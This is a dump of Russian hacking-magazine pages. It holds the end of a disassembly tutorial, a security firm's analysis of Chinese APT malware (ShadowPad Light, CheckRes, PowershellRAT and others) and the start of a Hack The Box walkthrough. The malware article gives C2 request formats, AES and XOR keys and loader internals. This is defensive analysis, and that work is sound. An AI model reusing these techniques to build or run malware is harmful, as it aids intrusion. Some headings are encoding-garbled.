; Перемножаем два вещественных значения одинарной точности
                mulss   xmm0, cs:__real@40400000
                movaps  xmm1, xmm0
                mov     rcx, cs:std::basic_ostream<char,std::ch
ar_traits<char>> std::cout
; Формируем строку для вывода итогового результата предыдущего
умножения
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(float)
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                mov     rcx, rax
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(std::basic_ostream<char,std::ch
ar_traits<char>> &                (*)(std::basic_ostream<char,std:
:char_traits<char>> &))
                xor     eax, eax
                add     rsp, 48h
                retn
main            endp

А что будет, если ском пилировать этот пример с ключиком /Ox? А будет вот
что:


main            proc near                ; CODE XREF:
__scrt_common_main_seh+107↓p
                                          ; DATA XREF: .pdata:
ExceptionDir↓o
                sub     rsp, 28h
                mov     rcx, cs:std::basic_ostream<char,std::ch
ar_traits<char>> std::cout
                mov     edx, 20h ; ' '
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(int)
                mov     rcx, rax        ; _Ostr
                lea     rdx, _Val       ; " "
                call    std::operator<<<std::char_traits<char>>(
std::basic_ostream<char,std::char_traits<char>> &,char const *)
                mov     rcx, rax
                mov     edx, 0Dh
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(int)
                mov     rcx, rax        ; _Ostr
                lea     rdx, asc_1400032D0 ; " "
                call    std::operator<<<std::char_traits<char>>(
std::basic_ostream<char,std::char_traits<char>> &,char const *)
                mov     rcx, rax
                mov     edx, 1Ah
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(int)
                mov     rcx, rax
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(std::basic_ostream<char,std::ch
ar_traits<char>> &                (*)(std::basic_ostream<char,std:
:char_traits<char>> &))
                movsd   xmm1, cs:__real@4012000000000000
                mov     rcx, cs:std::basic_ostream<char,std::ch
ar_traits<char>> std::cout
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(double)
                mov     rcx, rax        ; _Ostr
                lea     rdx, asc_1400032DC ; " "
                call    std::operator<<<std::char_traits<char>>(
std::basic_ostream<char,std::char_traits<char>> &,char const *)
                movsd   xmm1, cs:__real@4023000000000000
                mov     rcx, rax
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(double)
                mov     rcx, rax        ; _Ostr
                lea     rdx, asc_1400032D8 ; " "
                call    std::operator<<<std::char_traits<char>>(
std::basic_ostream<char,std::char_traits<char>> &,char const *)
                mov     rcx, rax
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(std::basic_ostream<char,std::ch
ar_traits<char>> &                (*)(std::basic_ostream<char,std:
:char_traits<char>> &))
                movss   xmm1, cs:__real@40d33334
                mov     rcx, cs:std::basic_ostream<char,std::ch
ar_traits<char>> std::cout
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(float)
                mov     rcx, rax
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(std::basic_ostream<char,std::ch
ar_traits<char>> &                (*)(std::basic_ostream<char,std:
:char_traits<char>> &))
                xor     eax, eax
                add     rsp, 28h
                retn
main            endp

Ни одной локаль ной перемен ной, ни одного промежу точного вычисления! Все
выражения вычисляют ся на этапе ком пиляции, их резуль таты записы вают ся
прямиком в сек цию дан ных. При выполнении прог рамме остается просто заг-
рузить эти дан ные и вывести на экран! Никакого творческого процесса…


C++ Builder
Посмотрим, какой код сгенерирует на основе этой же прог раммы товарищ
Embarcadero C++Builder 10.4 с отключен ной оптимизацией:


main            proc near                ; DATA XREF:
__acrtused+29↑o
var_40           = qword ptr -40h
var_38           = qword ptr -38h
var_30           = qword ptr -30h
var_28           = dword ptr -28h
var_f           = dword ptr -24h
var_d           = qword ptr -20h
var_a           = dword ptr -14h
var_10           = qword ptr -10h
var_8            = dword ptr -8
var_4            = dword ptr -4
                push    rbp
                sub     rsp, 60h
                lea     rbp, [rsp+60h]
                lea     rax, xmmword_43A4F8
                mov     [rbp+var_4], 0
                mov     [rbp+var_8], ecx
                mov     [rbp+var_10], rdx
; Инициализация переменной var_a значением 2
                mov     [rbp+var_a], 2
; Загружаем в ECX значение переменной var_a
                mov     ecx, [rbp+var_a]
; А C++ Builder, в отличие от Visual C++, вместо умножения на
число в степени двойки применил логический сдвиг влево
; Умножаем var_a на 16 == var_a * (2 ^ 4)
                shl     ecx, 4
; Произведение помещаем в переменную var_28
                mov     [rbp+var_28], ecx
                mov     rcx, rax
                mov     edx, [rbp+var_28]
; Результат умножения выводим на терминал — первое слева число
                call    std::ostream::operator<<(int)
                lea     rdx, unk_42D050
                mov     rcx, rax
; Выводим пробел
                call    std::operator<<<std::char_traits<char>>(
std::basic_ostream<char,std::char_traits<char>> &,char const*)
; В R8D помещается значение переменной var_a
                mov     r8d, [rbp+var_a]
; Далее прямолинейно выполняются две математических операции,
составляющие выражение
; Сначала происходит сдвиг влево на две позиции, что равносильно
умножению на 4 (2^2)
                shl     r8d, 2
; Затем без лишнего словоблудия прибавляем к произведению число 5
                add     r8d, 5
; Обрати внимание: C++Builder не стал применять инструкцию LEA
для быстрого умножения и сложения чисел, а размазал выполнение на
отдельные команды, что как бы не идет на пользу результирующей
программе
                mov     rcx, rax
; Копируем результат из регистра R8D в регистр EDX для
последующего вывода оператором <<
                mov     edx, r8d
                call    std::ostream::operator<<(int)
                lea     rdx, unk_42D050
                mov     rcx, rax
; Вывод пробела
                call    std::operator<<<std::char_traits<char>>(
std::basic_ostream<char,std::char_traits<char>> &,char const*)
; Умножение на 13 производится обычным imul
                imul    edx, [rbp+var_a], 0Dh
                mov     rcx, rax
; Вывод произведения
                call    std::ostream::operator<<(int)
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                mov     rcx, rax
; Вывод символа начала новой строки
                call    std::ostream::operator<<(std::ostream & (*
)(std::ostream &))
                lea     rcx, xmmword_43A4F8
; Загрузка двух значений двойной точности из сегмента данных
только для чтения  в 128-битные регистры
                movsd   xmm0, cs:qword_42D018
                movsd   xmm1, cs:qword_42D020
; Одно из загруженных значений сохраняем в переменной var_d
                movsd   [rbp+var_d], xmm1
; Производим умножение этих значений
                mulsd   xmm0, [rbp+var_d]
                movaps  xmm1, xmm0
                mov     [rbp+var_30], rax
; Выводим результат произведения из регистра XMM1, скопированного
туда из XMM0
                call    std::ostream::operator<<(double)
                lea     rdx, unk_42D050
                mov     rcx, rax
; Выводим пробел
                call    std::operator<<<std::char_traits<char>>(
std::basic_ostream<char,std::char_traits<char>> &,char const*)
; Загрузка в регистр XMM0 значения из сегмента данных
                movsd   xmm0, cs:qword_42D010
; Умножение двух вещественных значений двойной точности: var_d *
XMM0
                mulsd   xmm0, [rbp+var_d]
; Преобразование знакового целого числа — var_a, занимающего два
слова, в вещественное значение двойной точности
                cvtsi2sd xmm1, [rbp+var_a]
; Прибавление к произведению значения переменной var_a: var_d *
XMM0 + var_a
                addsd   xmm0, xmm1
                mov     rcx, rax
; Результат выражения временно сохраняется в регистре XMM1
                movaps  xmm1, xmm0
; Вывод результата на терминал
                call    std::ostream::operator<<(double)
                lea     rdx, unk_42D050
                mov     rcx, rax
; Вывод пробела
                call    std::operator<<<std::char_traits<char>>(
std::basic_ostream<char,std::char_traits<char>> &,char const*)
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                mov     rcx, rax
; Вывод символа начала новой строки
                call    std::ostream::operator<<(std::ostream & (*
)(std::ostream &))
                lea     rcx, xmmword_43A4F8
; Загрузка двух значений одинарной точности из сегмента данных в
регистры XMM0 и XMM1
                movss   xmm0, cs:dword_42D000
                movss   xmm1, cs:dword_42D004
; Одно из значений копируем в переменную var_f
                movss   [rbp+var_f], xmm1
; Перемножение значений
                mulss   xmm0, [rbp+var_f]
; Произведение копируем в регистр XMM1 для передачи в качестве
параметра оператору <<
                movaps  xmm1, xmm0
                mov     [rbp+var_38], rax
; Выводим произведение на экран
                call    std::ostream::operator<<(float)
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                mov     rcx, rax
; Выводим символ начала новой строки
                call    std::ostream::operator<<(std::ostream & (*
)(std::ostream &))
                mov     [rbp+var_4], 0
                mov     [rbp+var_40], rax
                mov     eax, [rbp+var_4]
                add     rsp, 60h
                pop     rbp
                retn
main            endp

Радует, что C++Builder заменил умножение с участием числа в степени двойки
логическим сдвигом влево. Однако в современ ных процессорах этот способ
не позволяет много выиг рать в быстродействии, поэтому Visual C++ не стал
с этим заморачивать ся. Разочаровало то, что C++Builder не исполь зовал инс-
трук цию LEA для одновремен ного сложения и умножения, на этом ком пилятор
много потерял в быстродействии резуль тиру ющей прог раммы.
  Оптимизирован ный вариант кода на C++Builder рассмат ривать не стоит.
Если у Visual C++ код получается миниатюрным и акку рат ным, то у первого
распухает до неприличных размеров. Оптимизацией такое язык не повора-
чивается назвать!


                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ





          НАХОДИМ МАТЕМАТИЧЕСКИЕ ОПЕРАТОРЫ В
            ДИЗАССЕМБЛИРОВАННЫХ ПРОГРАММАХ





ÊÎÌÏËÅÊÑÍÛÅ ÎÏÅÐÀÒÎÐÛ
Язык С/С++ выгод но отличает ся от боль шинства своих кон курен тов под дер-
жкой ком плексных операторов: õ= (где x — любой элемен тарный оператор),
++ и -- .
  Ком плексные операторы семейства a x= b тран слируют ся в a = a x b,
и они иден тифицируют ся так же, как и элемен тарные операторы.
  Операторы ++ и -- в префик сной форме выражаются в тривиаль ные конс-
трук ции a = a + 1 и a = a – 1 , не пред ставляющие для нас никакого инте-
реса, но вот постфиксная форма — дело дру гое.
   Разберем малень кий примерчик (operatorplusplus):


#include <iostream>


int main()
{
    int i = 0;


    std::cout << ++i << std::endl;
    std::cout << i++ << std::endl;
    std::cout << i; // Отладочный вывод
}





              Резуль тат вывода примера operatorplusplus

Ском пилиру ем его с помощью Visual C++ 2022 с отключен ной оптимизацией:


main            proc near                ; CODE XREF:
__scrt_common_main_seh+107↓p
                                          ; DATA XREF: .pdata:
ExceptionDir↓o
var_i           = dword ptr -18h
var_14           = dword ptr -14h
var_10           = qword ptr -10h
                sub     rsp, 38h
; Инициализация переменной var_i нулем
                mov     [rsp+38h+var_i], 0
; Копирование значения переменной var_i в EAX
                mov     eax, [rsp+38h+var_i]
; Инкрементирование значения
                inc     eax
; Возвращаем увеличенное значение в переменную var_i
                mov     [rsp+38h+var_i], eax
; Копируем значение переменной var_i в EDX для вывода
                mov     edx, [rsp+38h+var_i]
                mov     rcx, cs:std::basic_ostream<char,std::ch
ar_traits<char>> std::cout
; Выводим var_i в измененном состоянии
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(int)

К текущему момен ту имеем такой код:


var_i = 0;
var_i++;
cout << var_i;


                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                mov     rcx, rax
; Вывод символа начала новой строки
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(std::basic_ostream<char,std::ch
ar_traits<char>> &                (*)(std::basic_ostream<char,std:
:char_traits<char>> &))
; Копируем в EAX значение переменной var_i
                mov     eax, [rsp+38h+var_i]
; Из EAX копируем значение в переменную var_14
                mov     [rsp+38h+var_14], eax
; Загружаем значение переменной var_14 в EDX явно для передачи
параметра
                mov     edx, [rsp+38h+var_14]
; Посмотри-ка, инкремент не выполнился до вывода значения
                mov     rcx, cs:std::basic_ostream<char,std::ch
ar_traits<char>> std::cout
; Выводим var_i в НЕизмененном состоянии
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(int)
                mov     [rsp+38h+var_10], rax
; Загружаем значение переменной var_i в регистр EAX
                mov     eax, [rsp+38h+var_i]
; Вот он, инкремент, только уже поздно — число-то уже выведено!
                inc     eax
; Возвращаем значение из регистра EAX в переменную var_i
                mov     [rsp+38h+var_i], eax
                lea     rdx, std::endl<char,std::char_traits<char>
>(std::basic_ostream<char,std::char_traits<char>> &)
                mov     rcx, [rsp+38h+var_10]
; Вывод символа начала новой строки
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(std::basic_ostream<char,std::ch
ar_traits<char>> &                (*)(std::basic_ostream<char,std:
:char_traits<char>> &))
; Это уже «отладочный» вывод значения переменной var_i, он погоды
не меняет
                mov     edx, [rsp+38h+var_i]
                mov     rcx, cs:std::basic_ostream<char,std::ch
ar_traits<char>> std::cout
                call    cs:std::basic_ostream<char,std::ch
ar_traits<char>>::operator<<(int)
                xor     eax, eax
                add     rsp, 38h
                retn
main            endp

Без учета последней коман ды вывода у нас получился такой листинг:


var_i = 0;
var_i++;
cout << var_i;
cout << var_i;
var_i++;

Что нем ного не соот ветству ет изначаль ным планам. Поэтому при исполь-
зовании ком плексных операторов язы ка C/C++ будь начеку.
   Теперь все точки над  i расставлены, осталось под вести итоги, и можно зак-
руглять ся.


ÂÛÂÎÄÛ
После определения пути выполнения прог раммы математические операции
составляют основу ее действий. Следователь но, они играют важнейшую роль
в прог раммах. Во время анализа дизассем блерных листингов важно правиль но
определить математические операторы, не запутать ся в их последователь нос-
ти.
  Многообразие арифметических операторов,  как мы  увидели,  зависит
от типа дан ных или размера операн дов. Для оптимизации вычислений ком-
пилятор  вправе  менять  порядок  математических  операторов,  упрощать
выражения, заменять их рядом более быстродейству ющих операций. Разоб-
рать ся во всем этом хит росплетении под час очень непросто! Но, я надеюсь,
сегод няшняя статья поможет тебе сориентировать ся во всем многообразии
сопровождающей любую прог рамму математики.
ВЗЛОМ





ЧТО МЫ НАШЛИ
В АРСЕНАЛЕ
КИТАЙСКИХ
APT-ГРУППИРОВОК


В прош лом году китай ские APT-груп пиров-
ки вели себя осо бен но активно. При этом
у каждой из них был свой уни кальный инс-
тру мен тарий. Перело патив тысячи строк
вредоносного кода, пой ман ного во время        Владимир Нестор                                                                                Инженер технического
расследова ния инци ден тов, мы обна ружи-      расследования Solar JSOC                                                                                CERT компании
ли немало любопыт ных фишек, о которых         «Ростелеком-Солар»r3seh@ya.ru
и расска жем в этой статье.


CHECKRES

Çàãðóçêà
Для запуска основной наг рузки  этот вредонос исполь зует пять файлов,
которые последователь но запускают друг дру га. Как это работает, вид но
на рисун ке ниже. Основная наг рузка запускает ся файлом cmd, который появ-
ляет ся в системе в самом начале работы вредоноса. Но при этом сам файл
cmd запускает ся еще не существу ющим в системе скриптом на VBS. Такой
ком плексный под ход к запуску основной наг рузки, вероятно, нужен для того,
чтобы обойти поведен ческий анализ.





                      Схема заг рузки CheckRes


Ìîäóëè
В начале работы полезной наг рузки с удален ного сервера  заг ружаются
модули.



POST-çàïðîñ äëÿ ïîëó÷åíèÿ ìîäóëÿ

POST /cgi-bin/pcupd.cgi/http/param_id.000 HTTP/1.0
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,
application/vnd.ms-excel, application/msword, application/vnd.ms-
powerpoint, */*
Accept-Language: de-at
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: <IP>
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Connection: Keep-Alive


lab=3999/06171252&size=1&data=F

С сервера может быть выг ружено до 16 модулей.





                      Заг рузка модулей CheckRes

Модули приходят  в  теле HTTP-запроса. Они запакованы,  закодированы
Base64 и окру жены тегом <update>.
  Модули пред ставляют собой DLL-файлы, где заголовок-заг лушка MS-DOS
заполнен нулями (вид но на скрин шоте ниже). При заг рузке с C&C парсится
таблица импортов и релокации. После этого для запуска модуля вызывается
entrypoint DLL-файла, где происходит создание потока. Создание потока необ-
ходимо, если требует ся продолжитель ная работа модуля, посколь ку исполня-
емый файл работает в одном потоке.





                   Заголовок модуля CheckRes

Каждый модуль выводит информацию о своей работе в файл, который рас-
положен по следующему пути:


%allusersprofile%\{F3F85CAE-3398-45f6-98C2-7DBFD3F3042C}

Файл вывода каждого модуля имеет свое расширение (например, .cap, .kst,
.rdd). Содержимое файла зашифровано при помощи операции XOR с генера-
тором псевдослу чайных чисел «Вихрь Мерсенна».


Âèõðü Ìåðñåííà
Модули для шифрования выход ных дан ных исполь зуют нек риптог рафический
генератор псевдослу чайных чисел «Вихрь Мерсенна» с изначаль ным значени-
ем  (seed)  11.  Все  парамет ры  соот ветству ют  стан дартному  алгорит му
для генерации 32-бит ных значений. В каждом модуле есть несколь ко харак-
терных  особен ностей,  связан ных  с  реализацией  алгорит ма.  Во-первых,
это изначаль ная инициализация массива, которая повторяется два  раза:
при первом заполнении значение seed устанавливается равным 5489. Затем,
никак не влияя на предыду щее заполнение, массив заполняет ся повторно
со значением seed, равным 11.





                   Двук ратная инициализация массива

Есть еще одна особен ность: исполь зует ся массив, равный двум поряд кам
рекуррен тной последователь ности, а имен но 1248. Таким образом, изначаль-
но инициализиру ется первая половина массива, после чего сог ласно алгорит-
му  на  основе  первой  части  генерирует ся  вторая  половина  массива.
При исполь зовании всех 624 сгенерирован ных элемен тов второй половины
первая затирается. А на основе второй половины по рекуррен тному соот-
ношению заполняет ся уже первая.
  В итоге одна половина массива всег да содержит дан ные для генерации
дру гой части. Можно было бы пред положить, что это сделано, чтобы упростить
реализацию: исполь зование одного цик ла для заполнения массива уже псев-
дослу чайными числами вместо двух. Но при заполнении первой части все же
приходит ся делить алгоритм заполнения массива на два цик ла, как это реали-
зовано здесь .
  И последняя особен ность касается «закалки» псевдослу чайного числа.
В изначаль ном алгорит ме пред полагается сначала битовый сдвиг на кон стан-
ту, а затем производит ся побитовое логическое И. Здесь же порядок изменен,
что повлияло на кон стан ты, исполь зуемые для этой операции. Так, кон стан та
0xefc60000 здесь пред ставлена в виде значения 0xFFFFDF8C.





                Закаливание псевдослу чайного числа


SHADOWPAD LIGHT 2021

ShadowPad   Light —  облегчен ная  версия  оригиналь ного  ShadowPad
без обфускации кода. Несмотря на то что этот семпл очень похож на ори-
гиналь ный ShadowPad, у него есть свои особен ности.


Çàãðóçêà
ShadowPad Light поставляется тремя файлами:
 • hpdigital.exe — легитим ный исполняемый файл, имеющий под пись
   ком пании HP;
 • hpqhvsei.dll — вредоносная библиотека, заг ружается посредством тех-
   ники DLL hijacking;
 • hpqlpvdt.tmp — шифрован ная наг рузка, которая содержит распаковщик
   и полезную вредоносную наг рузку, так же хранит в себе первоначаль ный
   необходимый для работы набор модулей.

Файл  hpdigital.exe  «вручную»  под гру жает  библиотеку  hpqhvsei.dll
при помощи LoadLibraryW, после чего так же выг ружает файл при помощи
фун кции FreeLibrary. При заг рузке библиотеки hpqhvsei.dll расшифро-
вывает файл hpqlpvdt.tmp.





           Алгоритм расшифровки заг рузчика ShadowPad Light

При выг рузке библиотеки вредоносная hpqhvsei.dll пат чит код в памяти
hpdigital.exe, что пред ставлено на рисун ке ниже. Таким образом, после
завершения работы библиотеки и выг рузки ее из памяти основной модуль
переходит к вредоносному заг рузчику из файла hpqlpvdt.tmp.





  Исправление памяти легитим ного файла для перехода к заг рузчику вре-
  доносного кода

Заг рузчик в свою очередь расшифровывает полезную наг рузку. Исполь зует ся
алгоритм AES и вот такой ключ:


726e6e7358786d3853483377464f7064

Далее  он  ее  распаковы вает  (алгоритм  lzma1)  при  помощи  фун кции
RtlDecompressBuffer. Распакован ная полезная наг рузка имеет заголовок not
full PE, который включает дан ные о содержащихся сек циях и точке входа. Его
струк тура пред ставлена в листинге ниже.



Çà ãîëîâîê îñíîâíîé ïîëåçíîé íàãðóçêè

struct __unaligned __declspec(align(4)) shadowpadl_header
{
  int MAGIC; // 0xdeed4554
  int notUsedField;
  int EntryPoint;
  unsigned __int64 RelocDiffConst;
  unsigned int ImageBase;
  int SectionCodeVirtualSize;
  int SectionCodeSize;
  int SectionDataVirtualSize;
  int SectionDataSize;
  int SectionEncDataVirtualSize;
  int SectionEncDataSize;
  int SectionRelocSize;
};

Если даль ше разбирать модули, можно увидеть, что у них почти такая же струк-
тура заголовка. Единствен ное отличие — у модулей в начале есть еще одно
поле, которое пред положитель но означает дату создания. Поле notUsedField
обозначает ID модуля. Поле MAGIC — сиг натура 0xdeed4554. Сами модули
хранят ся в запакован ном (алгоритм snappy) и зашифрован ном виде в ресурсах
основной наг рузки. В качестве алгорит ма шифрования исполь зует ся потоко-
вый алгоритм salsa20, кон стан та для расширения ключа — arbitraryconstat.
  От дель но отметим алгоритм обработ ки релоков. При заг рузке PE-файла
для применения релоков требует ся два числа: изначаль ный базовый адрес
исполняемого файла и базовый адрес, по которому файл был заг ружен. Выс-
читывается разница между ними и прибавляет ся к тому адресу, по которому
необходимо применить релок. Формула выг лядит так:


diff = newimagebase - imagebase
dst = newimagebase + rva
for offset in offsets:
    dst[offset] += diff

В слу чае ShadowPad Light в струк туре присутству ет кон стан та, которая участву-
ет в первой операции. Таким образом, у нас выходит следующее преобразова-
ние:


diff = newimagebase - imagebase - relocdiffconst
dst = newimagebase + rva - imagebase
for offset in offsets:
    dst[offset] += diff

Помимо этого, в вычислении адреса релока участву ет imagebase, потому что
значение RVA содержит в себе значение imagebase.


Ñðàâíåíèå ñ ïðåäûäóùåé âåðñèåé ShadowPad
Сравним оригиналь ный ShadowPad с ShadowPad Light. Фун кция точки входа
плагинов в них нем ного отличает ся. На рисун ке показан код точки входа пла-
гинов старого ShadowPad (слева) и нового (справа).





  Сравнение фун кций точек входа. Слева — старая версия ShadowPad,
  справа — новая

Од на из харак терных особен ностей ShadowPad — хранение модулей в реес-
тре. В новом ShadowPad Light она тоже присутству ет, но распространяет ся
толь ко на дополнитель ные модули, которые заг ружаются с сервера. Там они
находят ся в таком же виде, в котором хранят ся встроенные модули в ресурсах
заг рузчика полезной наг рузки. То есть зашифрованы и упакованы тем же алго-
рит мом и имеют ту же струк туру заголовка.
   Теперь к изменениям, которым под вергся ShadowPad Light. Первое, что
бросает ся в глаза, — тут нет несколь ких способов обфускации, которые были
в старом ShadowPad. Отсутству ют:
 • обфускация вызовов внеш них фун кций;
 • обфускация техникой перек рытия инструк ций;
 • обфускация абсолют ными прыжками для перемешивания инструк ций.

Из-за этих изменений мы и назвали дан ный семпл ShadowPad Light.





     Обфускация вызова внеш них фун кций оригиналь ного ShadowPad





  Обфускация техникой перек рытия инструк ций оригиналь ного ShadowPad

Кроме этого, можно выделить еще ряд отличий:
 • струк тура заголовка модуля изменилась полностью. Новый ShadowPad
   не работает с виртуаль ными таблицами импорта. Вместо этого каждый
   модуль находит необходимые внеш ние фун кции через peb-заголовок.
  В листингах ниже пред ставлены струк туры заголовков плагинов для нового
   ShadowPad и его старого варианта;
 • применяются разные алгорит мы шифрования и архивации модулей;
 • модулям назначены новые иден тификаторы.



Ñòðóê òóðà çàãîëîâêà ìîäóëÿ ShadowPad Light

struct __unaligned __declspec(align(4)) shadowpadl_plugin_header
{
  int Timestamp;
  int MAGIC;
  int ModuleID;
  int EntryPoint;
  unsigned __int64 RelocDiffConst;
  unsigned int ImageBase;
  int SectionCodeVirtualSize;
  int SectionCodeSize;
  int SectionDataVirtualSize;
  int SectionDataSize;
  int SectionEncDataVirtualSize;
  int SectionEncDataSize;
  int SectionRelocSize;
};




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ





                               ЧТО МЫ НАШЛИ
                        В АРСЕНАЛЕ КИТАЙСКИХ
                               APT-ГРУППИРОВОК





Ñòðóê òóðà çàãîëîâêà ìîäóëÿ îðèãèíàëü íîãî ShadowPad

struct __unaligned __declspec(align(4))
old_shadowpad_plugin_header
{
  int ImageSize;
  int ImageBase;
  int RelocSectionVA;
  int RelocSectionSize;
  int ImportSectionVA;
  int ImportSectionSize;
  int AddressOfEntryPoint;
  int NumberOfSections;
  int Timestamp;
  int SectionHeaders;
};

Далее в таблице пред ставлен список модулей, которые нам довелось проана-
лизировать. Модули, у которых ID в интервале с 0x30 по 0xb0, встроены в сам
вредоносный файл и не попадают в реестр. Осталь ные модули добавляют ся
во время работы ShadowPad и были обнаружены в заражен ной системе в реес-
тре.





POWERSHELLRAT

Главная особен ность этого вредоноса — исполь зование стеганог рафии LSB
для хранения полезной наг рузки. Если крат ко, то информация хранит ся в пос-
ледних битах каждого канала пик селя картинки. То есть для хранения одного
байта нужно два пик селя c четырь мя каналами: RGBA. При изменении толь ко
последнего бита невозможно увидеть невоору жен ным взглядом искажение
картинки.
  Перейдем  непосредствен но  к  вредоносу.  PowershellRAT  поставляется
в составе трех файлов:
 • динамическая библиотека, которая является сервисом;
 • под гру жаемый сервисом файл, который ищет и заг ружает вредоносный
   PowerShell-скрипт;
 • картинка, которая содержит PowerShell-скрипт.




                 Парамет ры вредоносного сервиса

Заг ружаясь, сервис настраивает окру жение .NET и под гру жает вредоносную
библиотеку Jsprofile.dll.





     Вы зов метода Setlter класса Jsplter пространства имен Jsprole

Эта библиотека вызывает метод Jsprofile.Jspfilter.Setfilter, который
ищет файл с расширением .png.





                Поиск картинки в файловой системе

Этот файл и есть та самая картинка c режимом RGBA, в которой посредством
стеганог рафии (LSB) спрятан скрипт на PowerShell. Перед извлечением содер-
жимого картинки проверяется ряд парамет ров, которым она должна соот ветс-
твовать. Среди них:
 • размер картинки — ширина и высота должны быть боль ше определен ных
   значений;
 • сиг натура: f16a921dd97e467c.




                    Проверка размера картинки





  Проверка сиг натуры дан ных и преобразование дан ных в число — длину
  зашифрован ных дан ных

Сначала идет заголовок:


struct header {
    char signature[8]; // f16a921dd97e467c
    int len_data;
}

Далее — зашифрован ный и упакован ный скрипт на PowerShell. Алгоритм сжа-
тия —  bzip.  Алгоритм шифрования —  цик лический XOR  с  байтами
52298b5337f5baaa.


REMSHELL, SMANAGER, MAIL-O

Следующий семпл, про который хотим рассказать, написан на язы ке прог-
раммирования Go. Нам показалось, что он очень похож на семейства вредоно-
сов Mail-O и Smanager. Поэтому мы решили их сравнить и обнаружили раз-
витие в сторону упрощения разработ ки коман дного сервера и вредоносного
приложения (клиента):
 • для разработ ки исполь зован язык Go;
 • вернулись к взаимодействию по протоколу HTTP;
 • работает в виде самостоятель ного исполняемого файла, а не службы.

Если сравнить с Smanager, то можно отметить, что для сок рытия трафика
от возможной MITM-атаки в новой версии исполь зует ся шифрование содер-
жимого HTTP-протокола при помощи алгорит ма AES вместо техники SSL
pinning с реализацией через SSPI. Это опять же упрощает разработ ку. Ниже —
сравнение выделен ных нами харак теристик.





                       Коман ды Go-Sample


PYTHONRAT

И еще один вредонос, который разберем в этой статье, — PythonRAT, пред-
ставляющий собой ском пилирован ный при помощи pyinstaller исполняемый
файл. После извлечения питоновских файлов из исполняемого файла мы най-
дем файл client, при деком пиляции которого возникает ошибка. При прос-
мотре в hex-редак торе мы увидим, что заголовок pyc-файла отсутству ет, вмес-
то этого сразу же идет заголовок CodeObject, а имен но тип объекта (0x63),
затем пять четырехбайтовых значений.





   Струк тура объекта кода, взятая из исходного кода cPython2.7, marshal.c





                     Заголовок файла client

После восстановления заголовка появляет ся возможность произвести деком-
пиляцию при помощи uncompyle2. Внут ри содержится код основной наг рузки
вредоносного файла более чем на 1500 строк. Здесь находят ся получение
команд  и  их  обработ ка. Шифрование  выполняет ся вшитыми  ключами
при помощи алгорит ма AES, а для общения с сервером C&C исполь зует ся
библиотека zlib. Причем для шифрования принимаемых и отправляемых дан-
ных применяются разные ключи.





                  Код получения и обработ ки команд


ÂÛÂÎÄÛ

В общем, инстру мен тарий китайских APT-группировок отличает ся дву мя инте-
ресными момен тами. С одной стороны, это боль шое разнообразие техник
и средств для выполнения вредоносных действий. Здесь и исполь зование
модуль ной архитек туры, и широкий ряд применяемых язы ков прог раммирова-
ния.
  С дру гой стороны, мы видим тен денцию к упрощению разработ ки вре-
доносного ПО: исполь зование высокоуровневых язы ков прог раммирования,
отказ от обфускации кода в поль зу методов усложнения доступа к коду
с полезной наг рузкой. Злоумыш ленники делают ставку на быструю разработ ку,
а так же на противодействие обнаружению и быстрому анализу их кода.
  Вредоносы часто и так достигают своих целей вне зависимости от исполь-
зуемых методов обфускации. Поэтому защита от ком плексного под хода к изу-
чению ВПО китайских хакеров волнует в мень шей степени.
ВЗЛОМ





          АНАЛИЗИРУЕМ И
        ПЕРЕКОМПИЛИРУЕМ
     ПРИЛОЖЕНИЕ ДЛЯ ANDROID




Сегод ня мы про ана лизи руем при ложение
для Android, под берем ся к скры тому сай ту,
порабо таем с плат формой Cachet, что бы
получить доступ к хосту, и реком пилиру ем
при ложение, что бы повысить при вилегии.             RalfHacker                                                                                          hackerralf8@gmail.com
Все это в рам ках про хождения сред ней
по сложности машины Catch с пло щад ки
Hack The Box.




                     Под ключаться к машинам с HTB рекомендует ся
                        только через VPN. Не делай этого с компьютеров,
                       где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с дру гими учас тни ками.



ÐÀÇÂÅÄÊÀ
Ñêàíèðîâàíèå ïîðòîâ
Начинаем, как водит ся, со сканирования портов исследуемой машины. Ее IP
сразу добавляем в /etc/hosts:


10.10.11.150    catch.htb

И запускаем сканирование портов.




Сканирование портов — стан дартный первый шаг при любой атаке. Он поз-
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инстру мент для сканирования — это Nmap. Улучшить
резуль таты его работы ты можешь при помощи следующего скрипта.


